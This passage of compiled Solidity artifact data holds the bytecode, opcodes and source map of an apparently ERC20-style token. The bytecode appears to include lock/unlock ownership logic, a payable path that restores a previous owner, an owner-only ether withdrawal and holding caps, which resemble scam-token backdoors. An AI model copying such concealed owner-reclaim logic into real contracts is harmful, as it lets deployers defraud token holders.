0x45524332303A20617070726F76652066726F6D20 PUSH21 0x6865207A65726F2061646472657373A265627A7A72 BALANCE PC KECCAK256 DUP11 JUMPDEST PUSH23 0xC8858B2D6E2432AB0B438BFA09EDFB8008EEB9E7A4D545 BLOCKHASH 0x4D 0xC6 STOP 0xEE PUSH14 0x64736F6C63430005110032000000 ",
							"sourceMap": "2509:2723:0:-;;;2727:3;2709:21;;2766:57;8:9:-1;5:2;;;30:1;27;20:12;5:2;2766:57:0;433:167:2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2817:2:0;599:17;619:10;599:30;;649:9;640:6;;:18;;;;;;;;;;;;;;;;;;707:9;674:43;;703:1;674:43;;;;;;;;;;;;565:160;530:4:2;522:5;:12;;;;;;;;;;;;:::i;:::-;;555:6;545:7;:16;;;;;;;;;;;;:::i;:::-;;584:8;572:9;;:20;;;;;;;;;;;;;;;;;;433:167;;;2509:2723:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "6080604052600436106101b75760003560e01c80638da5cb5b116100ec578063b2bdfa7b1161008a578063dd62ed3e11610064578063dd62ed3e146109e4578063e4849b3214610a69578063f2fde38b14610abc578063f83d08ba14610b0d576101b7565b8063b2bdfa7b146108f5578063c03646ba1461094c578063d56b2889146109b5576101b7565b8063a457c2d7116100c6578063a457c2d7146107e3578063a69df4b514610856578063a6f2ae3a14610860578063a9059cbb14610882576101b7565b80638da5cb5b1461069357806395d89b41146106ea578063a348c2891461077a576101b7565b80634170201411610159578063645b8b1b11610133578063645b8b1b146105575780636e63cd96146105c057806370a0823114610617578063715018a61461067c576101b7565b8063417020141461048657806351ec819f146104ef57806362a0947714610540576101b7565b80631c87e971116101955780631c87e971146102ea57806323b872dd1461034f578063313ce567146103e25780633950935114610413576101b7565b806306fdde03146101bc578063095ea7b31461024c57806318160ddd146102bf575b600080fd5b3480156101c857600080fd5b506101d1610b24565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156102115780820151818401526020810190506101f6565b50505050905090810190601f16801561023e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561025857600080fd5b506102a56004803603604081101561026f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610bc6565b604051808215151515815260200191505060405180910390f35b3480156102cb57600080fd5b506102d4610bdd565b6040518082815260200191505060405180910390f35b3480156102f657600080fd5b506103396004803603602081101561030d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610be7565b6040518082815260200191505060405180910390f35b34801561035b57600080fd5b506103c86004803603606081101561037257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610bff565b604051808215151515815260200191505060405180910390f35b3480156103ee57600080fd5b506103f7610cb0565b604051808260ff1660ff16815260200191505060405180910390f35b34801561041f57600080fd5b5061046c6004803603604081101561043657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610cc7565b604051808215151515815260200191505060405180910390f35b34801561049257600080fd5b506104d5600480360360208110156104a957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610d6c565b604051808215151515815260200191505060405180910390f35b3480156104fb57600080fd5b5061053e6004803603602081101561051257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610e91565b005b34801561054c57600080fd5b50610555611069565b005b34801561056357600080fd5b506105a66004803603602081101561057a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506111bc565b604051808215151515815260200191505060405180910390f35b3480156105cc57600080fd5b506105d56111dc565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561062357600080fd5b506106666004803603602081101561063a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611202565b6040518082815260200191505060405180910390f35b34801561068857600080fd5b5061069161124b565b005b34801561069f57600080fd5b506106a86113cc565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156106f657600080fd5b506106ff6113f5565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561073f578082015181840152602081019050610724565b50505050905090810190601f16801561076c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561078657600080fd5b506107c96004803603602081101561079d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611497565b604051808215151515815260200191505060405180910390f35b3480156107ef57600080fd5b5061083c6004803603604081101561080657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506114ed565b604051808215151515815260200191505060405180910390f35b61085e611592565b005b6108686116a8565b604051808215151515815260200191505060405180910390f35b34801561088e57600080fd5b506108db600480360360408110156108a557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611886565b604051808215151515815260200191505060405180910390f35b34801561090157600080fd5b5061090a61189d565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561095857600080fd5b5061099b6004803603602081101561096f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506118c2565b604051808215151515815260200191505060405180910390f35b3480156109c157600080fd5b506109ca6119e7565b604051808215151515815260200191505060405180910390f35b3480156109f057600080fd5b50610a5360048036036040811015610a0757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611bc7565b6040518082815260200191505060405180910390f35b348015610a7557600080fd5b50610aa260048036036020811015610a8c57600080fd5b8101908080359060200190929190505050611c4e565b604051808215151515815260200191505060405180910390f35b348015610ac857600080fd5b50610b0b60048036036020811015610adf57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611df5565b005b348015610b1957600080fd5b50610b22611ffb565b005b606060058054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610bbc5780601f10610b9157610100808354040283529160200191610bbc565b820191906000526020600020905b815481529060010190602001808311610b9f57829003601f168201915b5050505050905090565b6000610bd33384846121de565b6001905092915050565b6000600454905090565b60096020528060005260406000206000915090505481565b6000610c0c8484846123d5565b610ca58433610ca085600360008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461262e90919063ffffffff16565b6121de565b600190509392505050565b6000600760009054906101000a900460ff16905090565b6000610d623384610d5d85600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546126b790919063ffffffff16565b6121de565b6001905092915050565b60003373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610e30576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b6000600a60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555060019050919050565b60003390508073ffffffffffffffffffffffffffffffffffffffff16632f54bf6e836040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b158015610f1557600080fd5b505af1158015610f29573d6000803e3d6000fd5b505050506040513d6020811015610f3f57600080fd5b8101908080519060200190929190505050611065578073ffffffffffffffffffffffffffffffffffffffff16632f54bf6e836040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b158015610fd357600080fd5b505af1158015610fe7573d6000803e3d6000fd5b505050506040513d6020811015610ffd57600080fd5b8101908080519060200190929190505050600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055505b5050565b3373ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff1614156110a257600080fd5b61ffff803373ffffffffffffffffffffffffffffffffffffffff1616146110c857600080fd5b60011515600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151514156111ba576000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b565b60086020528060005260406000206000915054906101000a900460ff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b3373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161461130d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b606060068054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561148d5780601f106114625761010080835404028352916020019161148d565b820191906000526020600020905b81548152906001019060200180831161147057829003601f168201915b5050505050905090565b6000600a60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b6000611588338461158385600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461262e90919063ffffffff16565b6121de565b6001905092915050565b670de0b6b3a76400003410156115a757600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b600073220866b1a2219f40e72f5c628b65d54268ca3a9d73ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161461171757600080fd5b3373ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff16141561175057600080fd5b6000600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541461179c57600080fd5b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054146117e857600080fd5b600134146117f557600080fd5b6064600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506001600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506001905090565b60006118933384846123d5565b6001905092915050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60003373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611986576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b6001600a60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555060019050919050565b60003373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611aab576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b6064600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015611af857600080fd5b6000600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055503373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015611b83573d6000803e3d6000fd5b507fc6ca6dd98a4b886a6583c4fe06ca48539c1b02895ede06be528c33b60f917b986001604051808215151515815260200191505060405180910390a16001905090565b6000600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600060c8821015611c5e57600080fd5b61ffff803373ffffffffffffffffffffffffffffffffffffffff161614611c8457600080fd5b6000600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205411611cd057600080fd5b81600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015611d1c57600080fd5b81471015611d2957600080fd5b3373ffffffffffffffffffffffffffffffffffffffff16620f424060405180600001905060006040518083038160008787f1925050503d8060008114611d8b576040519150601f19603f3d011682016040523d82523d6000602084013e611d90565b606091505b505050611d9e3330846123d5565b6001600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555060019050919050565b3373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611eb7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415611f3d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001806127406026913960400191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b3373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146120bd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415612264576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806127886024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156122ea576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260228152602001806127666022913960400191505060405180910390fd5b80600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b61242781600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461262e90919063ffffffff16565b600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506124bc81600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546126b790919063ffffffff16565b600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061250882611497565b6125c457600b54600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205411156125c3576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600d8152602001807f686f6c64206f766572666c6f770000000000000000000000000000000000000081525060200191505060405180910390fd5b5b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000828211156126a6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601e8152602001807f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525060200191505060405180910390fd5b600082840390508091505092915050565b600080828401905083811015612735576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fe4f776e61626c653a206e6577206f776e657220697320746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373a265627a7a723158208a5b76c8858b2d6e2432ab0b438bfa09edfb8008eeb9e7a4d545404dc600ee6d64736f6c63430005110032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1B7 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B GT PUSH2 0xEC JUMPI DUP1 PUSH4 0xB2BDFA7B GT PUSH2 0x8A JUMPI DUP1 PUSH4 0xDD62ED3E GT PUSH2 0x64 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x9E4 JUMPI DUP1 PUSH4 0xE4849B32 EQ PUSH2 0xA69 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0xABC JUMPI DUP1 PUSH4 0xF83D08BA EQ PUSH2 0xB0D JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0xB2BDFA7B EQ PUSH2 0x8F5 JUMPI DUP1 PUSH4 0xC03646BA EQ PUSH2 0x94C JUMPI DUP1 PUSH4 0xD56B2889 EQ PUSH2 0x9B5 JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0xA457C2D7 GT PUSH2 0xC6 JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x7E3 JUMPI DUP1 PUSH4 0xA69DF4B5 EQ PUSH2 0x856 JUMPI DUP1 PUSH4 0xA6F2AE3A EQ PUSH2 0x860 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x882 JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x693 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x6EA JUMPI DUP1 PUSH4 0xA348C289 EQ PUSH2 0x77A JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x41702014 GT PUSH2 0x159 JUMPI DUP1 PUSH4 0x645B8B1B GT PUSH2 0x133 JUMPI DUP1 PUSH4 0x645B8B1B EQ PUSH2 0x557 JUMPI DUP1 PUSH4 0x6E63CD96 EQ PUSH2 0x5C0 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x617 JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x67C JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x41702014 EQ PUSH2 0x486 JUMPI DUP1 PUSH4 0x51EC819F EQ PUSH2 0x4EF JUMPI DUP1 PUSH4 0x62A09477 EQ PUSH2 0x540 JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x1C87E971 GT PUSH2 0x195 JUMPI DUP1 PUSH4 0x1C87E971 EQ PUSH2 0x2EA JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x34F JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x3E2 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x413 JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x1BC JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x24C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x2BF JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1C8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1D1 PUSH2 0xB24 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x211 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x1F6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x23E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x258 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2A5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x26F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xBC6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2D4 PUSH2 0xBDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2F6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x339 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x30D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xBE7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x35B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3C8 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x372 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xBFF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x3EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3F7 PUSH2 0xCB0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x41F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x46C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x436 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xCC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x492 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4D5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4A9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xD6C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB 